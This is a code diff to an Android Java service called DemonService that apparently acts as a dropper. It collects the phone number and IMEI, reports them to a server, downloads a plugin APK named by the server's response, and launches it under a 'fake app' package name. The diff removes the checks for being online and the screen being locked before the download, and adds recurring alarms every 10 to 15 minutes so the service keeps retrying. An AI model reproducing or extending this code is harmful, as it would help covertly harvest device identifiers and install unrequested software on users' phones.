@@ -9,7 +9,6 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.text.TextUtils;
 import com.plugin.common.utils.CustomThreadPool;
-import com.plugin.common.utils.SingleInstanceBase;
 import com.plugin.common.utils.StringUtils;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.common.utils.files.DiskManager;
@@ -54,8 +53,11 @@ public class DemonService extends IntentService {
                 CustomThreadPool.asyncWork(new Runnable() {
                     @Override
                     public void run() {
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[DemonService::onHandleIntent]] try to handle action : " + ACTION_LANUCH);
+                        }
                         try {
-                            cancelHourAlarm(getApplicationContext());
+                            cancelAlarmForAction(getApplicationContext(), ACTION_LANUCH);
                             String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
                             if (TextUtils.isEmpty(phone)) phone = "00000000000";
                             LanuchRequest request = new LanuchRequest(UtilsRuntime.getVersionName(getApplicationContext())
@@ -79,7 +81,7 @@ public class DemonService extends IntentService {
                                 }
 
                                 if (Config.DEBUG) {
-                                    Config.LOGD("[[App::onCreate]] lanuch time = " + UtilsRuntime.debugFormatTime(System.currentTimeMillis()));
+                                    Config.LOGD("[[DemonService]] lanuch time = " + UtilsRuntime.debugFormatTime(System.currentTimeMillis()));
                                 }
 
                                 String apkFileName = StringUtils.MD5Encode(response.url) + ".apk";
@@ -87,24 +89,29 @@ public class DemonService extends IntentService {
 
                                 if (UtilOperator.isPluginApkExist()) {
                                     if (Config.DEBUG) {
-                                        Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] plugin apk is exist on Path : "
+                                        Config.LOGD("[[DemonService]] plugin apk is exist on Path : "
                                                         + SettingManager.getInstance().getLocalApkPath());
                                     }
                                     return;
                                 } else {
                                     if (Config.DEBUG) {
-                                        Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] isOnline = " + UtilsRuntime.isOnline(getApplicationContext())
+                                        Config.LOGD("[[DemonService]] isOnline = " + UtilsRuntime.isOnline(getApplicationContext())
                                                         + " download process = " + Config.DOWNLOAD_PROCESS_RUNNING.get()
                                                         + " screenLocked = " + UtilsRuntime.isScreenLocked(getApplicationContext()));
                                     }
 
-                                    if (UtilsRuntime.isOnline(getApplicationContext())
-                                            && !Config.DOWNLOAD_PROCESS_RUNNING.get()
-                                            && !UtilsRuntime.isScreenLocked(getApplicationContext())) {
+                                    if (/*UtilsRuntime.isOnline(getApplicationContext())
+                                            && */!Config.DOWNLOAD_PROCESS_RUNNING.get()
+                                           /* && !UtilsRuntime.isScreenLocked(getApplicationContext())*/) {
                                         Handler handler = new Handler(getApplicationContext().getMainLooper());
                                         handler.postDelayed(new Runnable() {
                                             @Override
                                             public void run() {
+                                                if (Config.DEBUG) {
+                                                    Config.LOGD("[[DemonService]] try to download APK from : "
+                                                        + SettingManager.getInstance().getLocalApkPath()
+                                                        + " delay 1S");
+                                                }
                                                 Intent i = new Intent();
                                                 i.setClass(getApplicationContext(), DemonService.class);
                                                 i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
@@ -114,16 +121,21 @@ public class DemonService extends IntentService {
                                     }
                                 }
 
-                                UtilOperator.startActiveAlarm(getApplicationContext(), 30 * 60 * 1000);
-                                cancelHourAlarm(getApplicationContext());
+//                                UtilOperator.startActiveAlarm(getApplicationContext(), 30 * 60 * 1000);
+                                startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN, ((long) 30) * 60 * 1000);
+                                cancelAlarmForAction(getApplicationContext(), ACTION_LANUCH);
 
                                 return;
+                            } else {
+                                if (Config.DEBUG) {
+                                    Config.LOGD("[[DemonService]] Lanuch request return == NULL >>>>>>>>");
+                                }
                             }
                         } catch (Exception e) {
                             if (Config.DEBUG) e.printStackTrace();
                         }
 
-                        startHourAlarm(getApplicationContext());
+                        startAlarmForAction(getApplicationContext(), ACTION_LANUCH, (long) 10 * 60 * 1000);
                     }
                 });
             } else if (ACTION_ACTIVE_MAIN.equals(action)) {
@@ -131,9 +143,7 @@ public class DemonService extends IntentService {
 
                 activeQS();
             } else if (ACTION_ACTIVE_SERVICE.equals(action)) {
-//                if (SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled()) {
                 //尝试激活子程序
-
                 if (Config.DEBUG) {
                     Config.LOGD("[[DemonService::onHandleIntent]] try to active <<plugin>> package after 3S");
                 }
@@ -158,7 +168,6 @@ public class DemonService extends IntentService {
                     i.putExtra("packageName", AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae);
                 }
                 startService(i);
-//                }
             } else if (ACTION_DOWNLOAD_PLUGIN.equals(action)) {
                 if (Config.DEBUG) {
                     Config.LOGD("[[DemonService::onHandleIntent]] action = " + action);
@@ -169,10 +178,14 @@ public class DemonService extends IntentService {
     }
 
     private void activeQS() {
+        if (Config.DEBUG) {
+            Config.LOGD("[[DemonService::activeQS]]");
+        }
         CustomThreadPool.asyncWork(new Runnable() {
             @Override
             public void run() {
-                UtilOperator.cancelActiveAlarm(getApplicationContext());
+//                UtilOperator.cancelActiveAlarm(getApplicationContext());
+                cancelAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN);
                 try {
                     String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
                     if (TextUtils.isEmpty(phone)) phone = "00000000000";
@@ -184,34 +197,45 @@ public class DemonService extends IntentService {
                                                                  , UtilsRuntime.getIMEI(getApplicationContext()));
                     ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
                     if (response != null && !TextUtils.isEmpty(response.url)) {
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[DemonService::activeQS]] active success, response : " + response.toString());
+                        }
                         //激活成功
                         SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
+                        cancelAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN);
                         return;
                     }
-                } catch (Exception e){
+                } catch (Exception e) {
                 }
 
-                UtilOperator.startActiveAlarm(getApplicationContext(), 30 * 60 * 1000);
+//                UtilOperator.startActiveAlarm(getApplicationContext(), 30 * 60 * 1000);
+                startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN, ((long) 15) * 60 * 1000);
             }
         });
     }
 
-    public static void startHourAlarm(Context context) {
-        cancelHourAlarm(context);
+    public static void startAlarmForAction(Context context, String action, long delay) {
+        cancelAlarmForAction(context, action);
+        if (Config.DEBUG) {
+            Config.LOGD("[[DemonService::startAlarmForAction]] for action : " + action + " delay time : " + delay);
+        }
         Intent intent = new Intent();
-        intent.setAction(ACTION_LANUCH);
+        intent.setAction(action);
         intent.setClass(context, DemonService.class);
         PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
         long cur = System.currentTimeMillis();
-        long firstTime = cur + ((long) 10) * 60 * 1000;
+        long firstTime = cur + delay;
 
         AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
         am.set(AlarmManager.RTC, firstTime, sender);
     }
 
-    public static void cancelHourAlarm(Context context) {
+    public static void cancelAlarmForAction(Context context, String action) {
+        if (Config.DEBUG) {
+            Config.LOGD("[[DemonService::cancelAlarmForAction]] for action : " + action);
+        }
         Intent intent = new Intent();
-        intent.setAction(ACTION_LANUCH);
+        intent.setAction(action);
         intent.setClass(context, DemonService.class);
         PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
         AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
